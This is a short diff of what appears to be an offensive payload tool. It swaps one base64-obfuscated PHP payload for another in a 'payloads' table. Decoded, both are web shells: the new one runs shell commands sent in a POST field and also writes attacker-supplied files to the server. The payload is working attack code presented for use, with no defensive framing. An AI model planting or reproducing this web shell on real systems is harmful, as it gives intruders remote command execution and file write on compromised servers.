@@ -18,7 +18,7 @@ splash+="/____/_/ /_/\___/_/_/\__, /\___/_/ /_/   \n"
 splash+="                    /____/               \n"
 
 payloads = {
-  "php": b'<?php eval(base64_decode("JGM9KCRfUE9TVFsnY29udGVudCddKTsKJHI9c2hlbGxfZXhlYygkYyk7CmVjaG8gJHI7")); ?>',
+  "php": b'<?php eval(base64_decode("ZnVuY3Rpb24gaGV4VG9TdHIoJGhleCl7CiAgICAkc3RyaW5nPScnOwogICAgZm9yICgkaT0wOyAkaSA8IHN0cmxlbigkaGV4KS0xOyAkaSs9Mil7CiAgICAgICAgJHN0cmluZyAuPSBjaHIoaGV4ZGVjKCRoZXhbJGldLiRoZXhbJGkrMV0pKTsKICAgIH0KICAgIHJldHVybiAkc3RyaW5nOwp9CmlmKGlzc2V0KCRfUE9TVFsndXBsJ10pKSB7CiAgJG15ZmlsZSA9IGZvcGVuKCRfUE9TVFsndXBsJ10sICJ3Iikgb3IgZGllKCJVbmFibGUgdG8gb3BlbiBmaWxlISIpOwogIGZ3cml0ZSgkbXlmaWxlLCBoZXhUb1N0cigkX1BPU1RbJ2NvbnRlbnQnXSkpOwogIGVjaG8gInVwbG9hZCBzdWNjZXNzZnVsIjsKfSBlbHNlaWYoaXNzZXQoJF9QT1NUWydjb250ZW50J10pKSB7CiAgZWNobyBzaGVsbF9leGVjKCRfUE9TVFsnY29udGVudCddKTsKfQ==")); ?>',
 }
 
 filetypes = {
